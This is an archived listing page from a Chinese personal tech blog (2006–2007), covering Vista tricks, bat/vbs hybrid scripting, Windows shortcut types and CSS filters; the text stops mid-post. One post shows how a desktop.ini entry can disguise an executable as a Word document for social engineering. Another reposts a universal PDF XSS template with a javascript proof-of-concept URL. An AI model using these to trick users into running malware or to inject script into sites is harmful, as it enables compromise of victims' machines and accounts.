@@ -1,0 +1,856 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Est's Blog</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <link href="https://feeds.feedburner.com/initiative" type="application/rss+xml" rel="alternate" title="Est's Blog RSS Feed" />
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="This blog is rated&nbsp;&nbsp;R⃣ , viewer discretion is advised" />
+
+
+    <link rel="stylesheet" href="/theme/css/normalize.min.css" />
+    <link rel="stylesheet" href="/theme/css/style.css" />
+
+
+    <style>
+      body {
+        background: #ecedef url("/theme/img/ignasi_pattern_s.png") repeat;
+      }
+    </style>
+  </head>
+  <body class="list-body">
+<nav class="nav-bar side-padding">
+  <h1 class="nav-header"><a href="/" class="nav-text">
+    Est's Blog
+  </a></h1>
+  <div class="hamburger-menu">
+    <button onclick="hamburgerMenuPressed.call(this)" aria-haspopup="true" aria-expanded="false" aria-controls="menu" aria-label="Menu">
+      <span></span>
+      <span></span>
+    </button>
+    <ul id="menu" class="hamburger-menu-overlay">
+      <li><a href="/" class="hamburger-menu-overlay-link">Home</a></li>
+
+        <li><a href="/category/archive.html" class="hamburger-menu-overlay-link">archive</a></li>
+        <li><a href="/category/stderr.html" class="hamburger-menu-overlay-link">stderr</a></li>
+        <li><a href="/category/stdin.html" class="hamburger-menu-overlay-link">stdin</a></li>
+        <li><a href="/category/stdout.html" class="hamburger-menu-overlay-link">stdout</a></li>
+
+    </ul>
+  </div>
+</nav>    <main class="card-container side-gutter">
+      <header class="list-header">
+        <p class="list-header-subtext">This blog is rated&nbsp;&nbsp;R⃣ , viewer discretion is advised</p>
+        <!-- <h1 class="list-header-title">Est's Blog</h1> -->
+      </header>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/nu/13316"  rel="bookmark" >
+              <h2 class="card-title">哭了～工具盘被误删了</h2>
+            </a>
+            <p class="card-text"><p>今天有个顽固文件，在我的工具盘 D:\ 盘，输入 rd /s /q setup.1 回车的时候不小心<font color="#ff6600">又</font>按到了回车键上面的 \ ，然后，傻了一会儿，5GB的工具灰飞烟灭了～～～5555555～～～～FinalData中.......很多工具是绝版的低版本，可惜啊。<img src ="http://dormforce.net/Blog/electronixtar/aggbug/13316.aspx" width = "1" height = "1" /></p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2007-01-07T04:18:00+08:00">2007-01-07</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/nu/13315"  rel="bookmark" >
+              <h2 class="card-title">Vista下登陆QQ出现蓝屏</h2>
+            </a>
+            <p class="card-text"><p>删除npkcrypt.sys和npkcrypt.vxd文件即可<img src ="http://dormforce.net/Blog/electronixtar/aggbug/13315.aspx" width = "1" height = "1" /></p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2007-01-07T03:37:00+08:00">2007-01-07</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/nu/13296"  rel="bookmark" >
+              <h2 class="card-title">[原]Vista下的文件名欺骗</h2>
+            </a>
+            <p class="card-text"><p>打开一个文件夹比如说，E:\test ，空白处点右键，选择 属性，选择 自定义，然后可以给文件夹改个图标，这个可能地球人都知道了，不过Vista下有更好玩的东西，先随便给文件夹改个图标，点击 确定，然后，打开当前文件夹下的 desktop.ini（方法就很多了，最简单：直接在地址栏的当前路径后面接着输入 \desktop.ini 回车，当然，如果你启用了&ldquo;显示系统及隐藏文件&rdquo;的话，直接双击打开），记事本弹出来，加这么一句：</p>
+<p>LocalizedResourceName=Hacked By <a title="看看est的blog" href="http://www.dormforce.net/Blog/electronixtar" target="_blank">est</a></p>
+<p>保存，关闭记事本。</p>
+<p>把 desktop.ini 改名成其他，例如 desktop.ini2，然后再改回来，然后，返回上一级文件夹（快捷键Backspace，晕，我在教入门知识～～），看看，文件夹的名字变成了什么？</p>
+<p>&nbsp;<img alt="" src="http://dormforce.net/Blog/Attachment/642"/></p>
+<p><img alt="" src="http://dormforce.net/Blog/Attachment/643"/></p>
+<p>继续好玩的，首先在刚才的文件夹下面新建一个子文件夹，例如我这里是 E:\test\subtest\ 再次打开刚才的 desktop.ini，添几行：</p>
+<p>&nbsp;</p>
+<p>[LocalizedFileNames]<br/>
+subtest=Another Name </p>
+<p>&nbsp; </p>
+<p>接下来，又是，保存，关闭记事本，把 desktop.ini 改成其他名字，如 desktop.ini2（这样做是为了使explorer刷新，重新应用 desktop.ini 的属性），然后改回来，按F5刷新当前文件夹，看看 subtest 文件夹的名字是不是变成了 Another Name？ </p>
+<p><img alt="" src="http://dormforce.net/Blog/Attachment/644"/></p>
+<p><img alt="" src="http://dormforce.net/Blog/Attachment/645"/></p>
+<p>事实上文件夹的名字改变没有呢？没有。不信，点一下 Vista 资源管理器的 地址栏，呵呵，如图。 </p>
+<p><img alt="" src="http://dormforce.net/Blog/Attachment/646"/></p>
+<p><img alt="" src="http://dormforce.net/Blog/Attachment/647"/></p>
+<p>这个 trick 有什么用呢？好处是，我可以建立一个缩写名字的文件夹，这样便于输入路径，然后用desktop.ini这么修改下，显示成全称，美观。往坏处想呢，我有个 trojan.exe，图标和Word文档的一样，放在一个名字叫 virus\ 的文件夹下，这个 virus\ 文件夹下面用一个 desktop.ini 把 trojan.exe 伪装成 letter.docx（Office 2003及以前是 .doc，2007就是 .docx 格式了），然后，社会工程学让用户点击这个文件&hellip;&hellip;普通用户会说，这个文件的名字是 letter.doc（不是 letter.doc.exe ），是安全的，可以打开，双击后&hellip;&hellip;一切都结束了。 </p>
+<p>图里面有两个文件，一个 fake letter.docx，其实是一个exe，双击可以直接运行，图标是用ResHacker伪装的Word2007的图标，另一个 Normal Word Document.docx 是真正的 Word 2007 文档。光凭外观，你能区分exe和docx么？ </p>
+<p><img alt="" src="http://dormforce.net/Blog/Attachment/648"/></p>
+<p>版权所有，转载请注明出处。</p>
+<p>&nbsp;</p>
+<p>我是怎么发现这个秘密的呢？在这里：</p>
+<p>%appdata%\Microsoft\Windows\Start Menu\desktop.ini<br/>
+%appdata%\Microsoft\Windows\Start Menu\Programs\Accessories\desktop.ini</p>
+<p>&nbsp;这可能是我期末考试前最后一篇blog了，这学期为了 .NET，Vista，Ubuntu欠了不少功课，郁闷啊～～</p>
+<p>[内有附件]</p>
+<p><img src ="http://dormforce.net/Blog/electronixtar/aggbug/13296.aspx" width = "1" height = "1" /></p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2007-01-05T04:38:00+08:00">2007-01-05</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/nu/13295"  rel="bookmark" >
+              <h2 class="card-title">Vista的&ldquo;文件类型&rdquo;到哪里去了？</h2>
+            </a>
+            <p class="card-text"><p>以前要修改文件关联，比如说 .doc 文件的图标，一般是 资源管理器 的 工具 菜单（Win98下是 查看 菜单），点 文件和文件夹选项，然后点 文件类型，就可以修改了，但是在Vista下这招不管用了，到 控制面板 文件夹选项 里也没有找到。翻了一会儿，发现这个东西到 控制面板\默认程序\设置关联 里去了，呵呵。不过现在Vista下不能改图标了，只能动注册表了，郁闷。</p>
+<p><img src ="http://dormforce.net/Blog/electronixtar/aggbug/13295.aspx" width = "1" height = "1" /></p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2007-01-05T04:24:00+08:00">2007-01-05</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/nu/13292"  rel="bookmark" >
+              <h2 class="card-title">Universal XSS with PDF files: highly dangerous</h2>
+            </a>
+            <p class="card-text"><p></p>
+<p><a href="http://www.securityfocus.com/archive/1/455790/30/0/threaded">Universal XSS with PDF files: highly dangerous</a> </p>
+<p>Jan 03 2007 02:20AM<br>pdp (architect) (pdp gnucitizen googlemail com) (3 replies) </p>
+<p>I will be very quick and just point to links where you can read about<br>this issue.<br>It seams that PDF documents can execute JavaScript code for no<br>apparent reason by using the following template:<br>http://path/to/pdf/file.pdf#whatever_name_you_want=javascript:your_code_<br>here<br>You must understand that the attacker doesn't need to have write<br>access to the specified PDF document. In order to get an XSS vector<br>working you need to have a PDF file hosted on the target and that's<br>all about it. The rest is just a matter of your abilities and desires.<br>This finding was originally mentioned by Sven Vetsch, on his blog.<br>This is a very good and quite interesting. Good work.<br>There is a POC I composed:<br>http://www.google.com/librariancenter/downloads/Tips_Tricks_85x11.pdf#so<br>mething=javascript:function%20createXMLHttpRequest(){%20%20%20try{%20ret<br>urn%20new%20ActiveXObject('Msxml2.XMLHTTP');%20}catch(e){}%20%20%20try{%<br>20return%20new%20ActiveXObject('Microsoft.XMLHTTP');%20}catch(e){}%20%20<br>%20try{%20return%20new%20XMLHttpRequest();%20}catch(e){}%20%20%20return%<br>20null;}var%20xhr%20=%20createXMLHttpRequest();xhr.onreadystatechange%20<br>=%20function(){%20%20%20%20if%20(xhr.readyState%20==%204)%20%20%20%20%20<br>%20%20%20alert(xhr.responseText);};xhr.open('GET',%20'http://www.google.<br>com',%20true);xhr.send(null);<br>More on the matter can be found here:<br>http://www.gnucitizen.org/blog/danger-danger-danger/<br>http://www.disenchant.ch/blog/hacking-with-browser-plugins/34<br>-- <br>pdp (architect) | petko d. petkov<br>http://www.gnucitizen.org</p>
+<p><img src ="http://dormforce.net/Blog/electronixtar/aggbug/13292.aspx" width = "1" height = "1" /></p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2007-01-05T02:55:00+08:00">2007-01-05</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/cnblogs/600416"  rel="bookmark" >
+              <h2 class="card-title">[原创]vbs/bat混合编程(2006-12-5修订版，支持参数传递)</h2>
+            </a>
+            <p class="card-text"><p>这个想法我思考了很久。<br/>
+<br/>
+巧妙利用 bat 和 vbs 的语法特征，让<font color="#ff0000">同一个</font>文件，被 cmd.exe 识别成批处理，让 wscrpt.exe 识别成 vbs，并且同时符合两者的语法，并且保证都没有错误，保证两者的高度兼容。经过一个通宵的努力，我实现了这种 bat/vbs 复合编程。<br/>
+<br/>
+<br/>
+一个 批处理&nbsp;&nbsp;.vbs 文件，在前面加一段代码（头），就变成了 .bat 批处理，注意，没有生成临时文件，不用修改任何原有代码。<br/>
+<br/>
+例子：保存下列代码为 test.bat，注意是批处理，但是这个批处理却成功的被 wsh 解析执行了！ </p>
+<blockquote class="code"><b class="smalltxt"><font size="2">CODE:</font></b>&nbsp;&nbsp;<a class="smalltxt" onclick="copycode(findobj('code0'));" href="http://www.cn-dos.net/forum/viewthread.php?tid=25333&amp;fpage=0&amp;highlight=&amp;page=1###"><font color="#003366" size="2">[Copy to clipboard]</font></a> <hr color="#dde3ec" size="1"/>
+<div id="code0" style="PADDING-RIGHT: 5px; PADDING-LEFT: 5px; PADDING-BOTTOM: 5px; PADDING-TOP: 5px; FONT-FAMILY: Courier New">:On Error Resume Next</div>
+<div style="PADDING-RIGHT: 5px; PADDING-LEFT: 5px; PADDING-BOTTOM: 5px; PADDING-TOP: 5px; FONT-FAMILY: Courier New">:Sub bat<br/>
+echo off &amp; cls<br/>
+echo Batching_codez_here_following_vbs_rules &amp; pause &gt;nul<br/>
+echo '&gt;nul &amp; start &quot;&quot; wscript //e:vbscript &quot;%~f0&quot; %*<br/>
+Exit Sub : End Sub</div>
+<div style="PADDING-RIGHT: 5px; PADDING-LEFT: 5px; PADDING-BOTTOM: 5px; PADDING-TOP: 5px; FONT-FAMILY: Courier New">MsgBox &quot;This is vbs&quot;<br/>
+for each i in wscript.arguments<br/>
+wscript.echo i<br/>
+next</div>
+<div style="PADDING-RIGHT: 5px; PADDING-LEFT: 5px; PADDING-BOTTOM: 5px; PADDING-TOP: 5px; FONT-FAMILY: Courier New">&nbsp;</div>
+</blockquote>
+<p>保存代码为 test.bat，可以看到 echo 出来的东西和 msgbox 出来的消息，呵呵<br/>
+<br/>
+以上代码只是一个示例，同时执行了 一段 批处理 和 vbs，没有生成临时文件。用了大量的 hack 技巧<br/>
+<br/>
+下面粗略解释下代码<br/>
+</p>
+<p>:On Error Resume Next </p>
+<p>cmd.exe 识别成一段注释<br/>
+wscript.exe 这样识别， : 在vbs语法里代表分行，然后 On Error Resume Next，也就是让WSH忽略一些错误</p>
+<p>echo '&gt;nul &amp; start &quot;&quot; wscript //e:vbscript &quot;%~f0&quot; %* <br/>
+<br/>
+cmd.exe 识别成：echo一个 '&nbsp; 到 空设备，也就是什么都不显示。&amp; 的意思是同时执行，那么同时执行了 start &quot;&quot; wscript //e:vbscript &quot;%~f0&quot; %*，也就是启动WSH，用VBS语法解析自身。<br/>
+<br/>
+这段代码的核心思想已经介绍完毕了。下面，为了让 批处理 以vbs调用其自身后，马上退出，我们需要 exit 或者 goto :eof，但是 goto call exit 在vbs又是一个关键词，所以我们只能用符合 vbs 语法的 exit sub，所以我们在第二句加一个<br/>
+:sub bat，作为注释 cmd.exe 跳过。然后在 6 句加一个 exit sub&nbsp;: end sub，让 批处理结束，exit 无论接什么参数都会使批处理退出的，同时又符合 vbs 的语法地借宿了一个 sub<br/>
+<br/>
+那个 echo off &amp; cls&nbsp;&nbsp;，批处理的意思就是相当于 @echo off ，但是 vbs 不认 @ 符号，所以改成 echo off &amp; cls ， vbs 可以解析为，调用一个叫 echo() 的函数，参数为 off &amp; cls ，也就是两个字符串 off 和 cls 相加 <br/>
+<br/>
+Well，接下来，你可以自由地在批处理中书写vbs脚本了，效率和真正的vbs一样高！<br/>
+<br/>
+这段代码的好处是：不用生成临时文件。其实用 echo 或者 more 或者 find 来生成临时vbs很浪费系统资源的，用我写的这段代码，就完全免去了这些麻烦。直接混合编程，以 start wscript -e:vbs &quot;%~f0&quot; 为界限，上面写 批处理，下面写 vbs，并行不悖！<br/>
+</p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2006-12-22T05:52:00+08:00">2006-12-22</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/cnblogs/600417"  rel="bookmark" >
+              <h2 class="card-title">[原创]Windows的11种快捷方式（2006-12-21修订版）</h2>
+            </a>
+            <p class="card-text"><p>&nbsp;<style type="text/css"></p>
+<!--
+div.Section1
+{}
+h3
+{margin-bottom:.0001pt;
+text-align:center;
+page-break-after:avoid;
+font-size:12.0pt;
+font-family:"Times New Roman"; margin-left:0in; margin-right:0in; margin-top:0in}
+span.SpellE
+{}
+h2
+{margin-bottom:.0001pt;
+page-break-after:avoid;
+font-size:12.0pt;
+font-family:"Times New Roman"; margin-left:0in; margin-right:0in; margin-top:0in}
+-->
+</style>
+<p>版权：electronixtar＠gmail.com</p>
+<p>快捷方式，很多人的反映就是那个小箭头，其实Windows支持9种快捷方式。</p>
+<p>关于这个格式</p>
+<p><font size="4">1. *.lnk<br/>
+</font>这是微软的通用快捷方式，很多电脑初学者当年就是把一个500MB的游戏在桌面上的1k大小的快捷方式复制到软盘里，然后回家双击打开一看，发现Windows提示&ldquo;找不到路径&rdquo;云云。后来才明白这只是个快捷方式。</p>
+<p>在命令行里打开一个 lnk 文件： Rundll32.exe url.dll, FileProtocolHandler %L</p>
+<p>lnk 的二进制格式 <a style="BEHAVIOR: url(http://202.115.22.199/FCKeditor/editor/css/behaviors/anchors.htc)" href="http://www.vckbase.com/document/viewdoc/?id=1411">http://www.vckbase.com/document/viewdoc/?id=1411</a></p>
+<p>其实 .LNK根 Windows Shell&nbsp;的关系比较紧密，在 Windows Vista 里，很多 Shell&nbsp;对象都可以通过 .lnk 文件来打开，所以 lnk 文件里全部是用 CLSID 作为引导</p>
+<p>在wsh/vbs里操作 .lnk 文件 <a style="BEHAVIOR: url(http://202.115.22.199/FCKeditor/editor/css/behaviors/anchors.htc)" href="http://download.microsoft.com/download/winscript56/Install/5.6/W982KMe/CN/scd56chs.exe">script56.chm::/html/wsconManagingShortcuts.htm</a> <br/>
+　</p>
+<p><font size="4">2. *.url</font></p>
+<p>.url 文件的格式和 .inf 的相似：<br/>
+<a href="http://www.cyanwerks.com/file-format-url.html">http://www.cyanwerks.com/file-format-url.html</a></p>
+<p><font size="4">3. *.pif</font></p>
+<p>这是相当古老的一种格式了<br/>
+<a href="http://www.smsoft.ru/en/pifdoc.htm">http://www.smsoft.ru/en/pifdoc.htm</a></p>
+<p><font size="4">4. FolderShortcut</font></p>
+<p>这个是未公开的一种快捷方式吧，不要理解成 文件夹<strong>的</strong>快捷方式了，我记得是从Win98就开始用这个东东了，貌似是和 Active Desktop 技术一起出现的。国内的首次公开是在这个帖子 <a href="http://bbs.onegreen.net/TopicOther.asp?t=5&amp;BoardID=2&amp;id=1414">http://bbs.onegreen.net/TopicOther.asp?t=5&amp;BoardID=2&amp;id=1414</a>&nbsp;，最简单的 文件夹快捷方式 是把一个文件夹拖放到 开始菜单</p>
+<p><img alt="" src="http://202.115.22.199/Blog/Attachment/549"/></p>
+<p>如下图：上面那个是直接拖放生成的 文件夹快捷方式，下面的是传统的 lnk 快捷方式。两者的明显不同是： 文件夹快捷方式 是可以在菜单里显示所指向目标文件夹的内容的。</p>
+<p><img alt="" src="http://202.115.22.199/Blog/Attachment/550"/></p>
+<p><img alt="" src="http://202.115.22.199/Blog/Attachment/551"/></p>
+<p>更为可喜的是，文件夹快捷方式没有小箭头！</p>
+<p><img alt="" src="http://202.115.22.199/Blog/Attachment/552"/></p>
+<p>文件夹快捷方式的属性有点怪怪的呢</p>
+<p><img alt="" src="http://202.115.22.199/Blog/Attachment/553"/></p>
+<p>手工建立 文件夹快捷方式 的方法：<br/>
+1. 在目标文件夹里建立一个 系统 隐藏 属性的 desktop.ini（cmd里 attrib +S +h desktop.ini），内容为：<br/>
+[.ShellClassInfo]<br/>
+CLSID2={0AFACED1-E828-11D1-9187-B532F1E9575D}<br/>
+Flags=2<br/>
+2. 保存，建立一个 一般的快捷方式，指向你的目标地址，名称为：target.lnk （必须是这个！）。<br/>
+3. 把该文件夹设为 只读 属性</p>
+<p>貌似文件夹快捷方式只能指向 文件夹 和 URL，不能指向文件。其实 文件夹快捷方式用在黑克攻防领域是相当的爽的，特别是结合 .lnk .url 的一些溢出，几乎是百发百中！（谁会想到，打开一个文件<strong>夹</strong>也会中病毒？）</p>
+<p><font size="4">5. HardLink</font></p>
+<p>NTFS的一大特性。在XP下可以通过 fsutil 建立（需要管理员权限）。</p>
+<p>C:\WINDOWS\system32&gt;fsutil hardlink create<br/>
+用法 : fsutil hardlink create &lt;新文件名&gt; &lt;现有文件名&gt;<br/>
+例如 : fsutil hardlink create c:\foo.txt c:\bar.txt</p>
+<p>HardLink有什么用呢？可以把<strong>一个</strong>文件，放到很多目录下，但是只占一个文件的空间，有点像那些 n 合 1 的光盘的原理。所以hardlink可以用来骗人啦，例如，我把我的一个2GB的GHOST镜像文件hardkink 1000次，那么我看这些所有文件的属性就是一个 2TB 啦，呵呵，其实我的硬盘没这么大。Hardlink 可以用来解决很多问题。比如说，系统里很多 dll 是重复的，我们就可以把一个 dll 做成很多 hardlink，这样可以大大的节省空间。需要注意的是，Hardlink 只实用于NTFS的分区，一个文件只能被Hardlink 1024ci ，而且只能在同一分区建立。</p>
+<p><font size="4">6. Junction Point </font></p>
+<p>相比于Hardlink，Junction Point 可以看作文件夹的硬连接吧，Vista里 Junction 已经被完全的符号连接取代了。</p>
+<p><font size="4">7. Reparse Point</font></p>
+<p>和Hardlink有点类似，不过是针对文件夹的，还是fsutil命令来管理</p>
+<p>C:\WINDOWS\system32&gt;fsutil reparsepoint<br/>
+---- 支持的 REPARSEPOINT 命令 ----</p>
+<p>query&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 查询重分析点<br/>
+delete&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 删除重分析点</p>
+<p>不过要建立的话，可以通过SysInternals的又一款作品&nbsp;<a href="http://www.sysinternals.com/files/junction.zip">http://www.sysinternals.com/files/junction.zip</a>&nbsp; 来建立</p>
+<p><font size="4">8. Symbolic Links</font></p>
+<p>符号连接允许你创建一个指针(pointer)，从目录的一个位置指向实际上位于别处的文件。NTFS并没有真正实现类似于UNIX系统中的符号连接，但通过重解析点，这种功能被模拟出来。实际上，一个符号连接就是一个重解析点，它将对一个文件的访问重定向到另一个文件。</p>
+<p><font size="4">9. Mount Point</font></p>
+<p>可以通过 mountvol 命令来管理。严格的说这已经不是快捷方式了，不过可以把一个储存媒体挂载到一个NTFS的文件夹下。</p>
+<p><font size="4">9. Shell Object</font></p>
+<p><font size="2">其实呢，&ldquo;字体&rdquo;文件夹就是一种典型的 Shell 对象。下载<a href="http://dormforce.net/Blog/Attachment/611">ShellExtView</a> ， <a href="http://dormforce.net/Blog/Attachment/612">ShellObjectEditor</a></font></p>
+<p><font size="4">10. Shell Command</font></p>
+<p>常见的有</p>
+<p>显示桌面.csf，内容为：<br/>
+[Shell] <br/>
+Command=2 <br/>
+IconFile=explorer.exe,3 <br/>
+[Taskbar] <br/>
+Command=ToggleDesktop </p>
+<p>改文件会DDE调用explorer来显示桌面</p>
+<p>查看频道.scf</p>
+<p>[Shell]<br/>
+Command=3<br/>
+IconFile=shdocvw.dll,-118</p>
+<p>[IE]<br/>
+Command=Channels</p>
+<p>explorer.scf</p>
+<p><br/>
+[Shell]<br/>
+Command=2<br/>
+IconFile=explorer.exe,1</p>
+<p>[Taskbar]<br/>
+Command=Explorer</p>
+<p>&nbsp;我总觉得 .scf 根 GNOME里的 .desktop 文件很相似呢，呵呵</p>
+<p>还有一种是复制文件的时候，拖放对象的一种特殊快捷方式，这类快捷方式都是 0 字节的文件，也是通过DDE调用的。例如：<br/>
+我的文档.mydocs<br/>
+ZIP压缩文件夹.ZFSendToTarget<br/>
+桌面.desklink<br/>
+邮件.mapmail<br/>
+</p>
+<p>Windows所支持的快捷方式基本上就这些了，快捷方式以极小的代价把一个文件在不同的位置展现了出来，给系统的使用带来了很大的方便，同时也带来了很多未知的安全隐患。如果有时间的话，下次继续，<a href="http://dormforce.net/blog/electronixtar">《快捷方式攻防战》</a></p>
+<p>[内有附件]</p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2006-12-22T05:52:00+08:00">2006-12-22</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/cnblogs/600412"  rel="bookmark" >
+              <h2 class="card-title">[原创]dHTML特效 alpha虑境之柔和边缘效果</h2>
+            </a>
+            <p class="card-text"><p><marquee onmouseover="this.stop()" style="OVERFLOW-Y: scroll; FILTER: alpha(Style=1,StartX=0,StartY=80,FinishX=0,FinishY=100)
+alpha(Style=1,StartX=0,StartY=20,FinishX=0,FinishY=0)" onmouseout="this.start()" direction="up" height="200">asdasd<br/><br />
+asdasd<br/><br />
+asdasd<br/><br />
+asdasd<br/><br />
+asdasd<br/><br />
+asdasd<br/><br />
+asdasd<br/><br />
+asdasd<br/><br />
+asdasd<br/><br />
+asdasd<br/><br />
+asdasd<br/><br />
+asdasd<br/><br />
+asdasd<br/><br />
+asdasd<br/><br />
+asdasd<br/><br />
+asdasd<br/><br />
+asdasd<br/><br />
+asdasd<br/><br />
+asdasd<br/><br />
+asdasd<br/><br />
+asdasd<br/><br />
+asdasd<br/><br />
+asdasd<br/><br />
+asdasd<br/><br />
+asdasd<br/><br />
+asdasd<br/><br />
+asdasd<br/><br />
+asdasd<br/><br />
+asdasd<br/><br />
+asdasd<br/><br />
+asdasd<br/><br />
+asdasd<br/><br />
+asdasd<br/><br />
+</marquee></p>
+<p>&nbsp;</p>
+<p>&lt;marquee<br/>
+height=&quot;200px&quot;<br/>
+direction=&quot;up&quot;<br/>
+onmouseover=&quot;this.stop()&quot;<br/>
+onmouseout=&quot;this.start()&quot;<br/>
+style=&quot;<br/>
+overflow-y:scroll;<br/>
+filter:<br/>
+alpha(Style=1,StartX=0,StartY=80,FinishX=0,FinishY=100)<br/>
+alpha(Style=1,StartX=0,StartY=20,FinishX=0,FinishY=0)<br/>
+;<br/>
+&quot;&gt;<br/>
+asdasd&lt;br /&gt;<br/>
+asdasd&lt;br /&gt;<br/>
+asdasd&lt;br /&gt;<br/>
+asdasd&lt;br /&gt;<br/>
+asdasd&lt;br /&gt;<br/>
+asdasd&lt;br /&gt;<br/>
+asdasd&lt;br /&gt;<br/>
+asdasd&lt;br /&gt;<br/>
+asdasd&lt;br /&gt;<br/>
+asdasd&lt;br /&gt;<br/>
+asdasd&lt;br /&gt;<br/>
+asdasd&lt;br /&gt;<br/>
+asdasd&lt;br /&gt;<br/>
+asdasd&lt;br /&gt;<br/>
+asdasd&lt;br /&gt;<br/>
+asdasd&lt;br /&gt;<br/>
+asdasd&lt;br /&gt;<br/>
+asdasd&lt;br /&gt;<br/>
+asdasd&lt;br /&gt;<br/>
+asdasd&lt;br /&gt;<br/>
+asdasd&lt;br /&gt;<br/>
+asdasd&lt;br /&gt;<br/>
+asdasd&lt;br /&gt;<br/>
+asdasd&lt;br /&gt;<br/>
+asdasd&lt;br /&gt;<br/>
+asdasd&lt;br /&gt;<br/>
+asdasd&lt;br /&gt;<br/>
+asdasd&lt;br /&gt;<br/>
+asdasd&lt;br /&gt;<br/>
+asdasd&lt;br /&gt;<br/>
+asdasd&lt;br /&gt;<br/>
+asdasd&lt;br /&gt;<br/>
+asdasd&lt;br /&gt;<br/>
+&lt;/marquee&gt;<br/>
+</p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2006-12-22T05:50:00+08:00">2006-12-22</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/cnblogs/600414"  rel="bookmark" >
+              <h2 class="card-title">CSS Filter: Light</h2>
+            </a>
+            <p class="card-text"><p>Added light FX to the picture on the left</p>
+<p>code:</p>
+<p>&nbsp;</p>
+<p>&lt;img<br/>
+style=&quot;filter:light();&quot;<br/>
+id=&quot;mypic&quot;<br/>
+src=&quot;C:\windows\web\wallpaper\bliss.bmp&quot;<br/>
+onload=&quot;javascript:this.filters.light.addCone(this.width/2,this.height/2,100,this.width/2,this.height/2,255,255,255,100,30)&quot;<br/>
+onmousemove=&quot;javascript:this.filters.light.moveLight(0,event.offsetX,event.offsetY,200,1)&quot; <br/>
+/&gt;</p>
+<p>&nbsp;</p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2006-12-22T05:50:00+08:00">2006-12-22</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/cnblogs/600410"  rel="bookmark" >
+              <h2 class="card-title">WinNT Namespace 与 ext3 结构</h2>
+            </a>
+            <p class="card-text"><p>Linux的 ext3 文件系统结构是 一个 / 根，然后衍生出整个PC的文件、设备、一切。 其实呢，WinNT 也是这样设计的，只是没有暴露给用户罢了。说白了， C:\ D:\ 等只是一个符号连接。如图：用了反汇编高手WQXNETQIQI推荐的工具，Sysinternals 的大作：WinObj</p>
+<p><img alt="" src="http://dormforce.net/Blog/Attachment/610"/></p>
+<p>&nbsp;在 cmd 命令行里，我们可以通过<br/>
+tree \\?\CdRom0<br/>
+来查看机器上第一个光驱的 目录结构，也可以通过<br/>
+type \\?\GLOBALROOT\Device\CdRom0\autorun.inf<br/>
+来读取 第一个光驱根目录下 autorun.ini 的内容。</p>
+<p>是不是和 Linux 的 cat /media/cdrom 有点相似呢？</p>
+<p>再看看一个WinNT NTFS的的命令：<br/>
+C:\&gt;mountvol<br/>
+创建、删除或列出卷装载点。<br/>
+MOUNTVOL [drive:]path VolumeName<br/>
+MOUNTVOL [drive:]path /D<br/>
+MOUNTVOL [drive:]path /L</p>
+<p>&nbsp;&nbsp;&nbsp; \\?\Volume{d1dd98a0-85e1-11db-9bf6-806d6172696f}\<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; C:\<br/>
+&nbsp;&nbsp;&nbsp; \\?\Volume{d1dd98a1-85e1-11db-9bf6-806d6172696f}\<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; D:\<br/>
+&nbsp;&nbsp;&nbsp; \\?\Volume{d1dd98a2-85e1-11db-9bf6-806d6172696f}\<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; E:\<br/>
+&nbsp;&nbsp;&nbsp; \\?\Volume{aa4a8921-f599-11da-9600-806d6172696f}\<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; F:\<br/>
+&nbsp;&nbsp;&nbsp; \\?\Volume{b2938600-f565-11da-a449-806d6172696f}\<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; G:\<br/>
+&nbsp;&nbsp;&nbsp; \\?\Volume{aa4a8920-f599-11da-9600-806d6172696f}\<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; A:\</p>
+<p>输入 <br/>
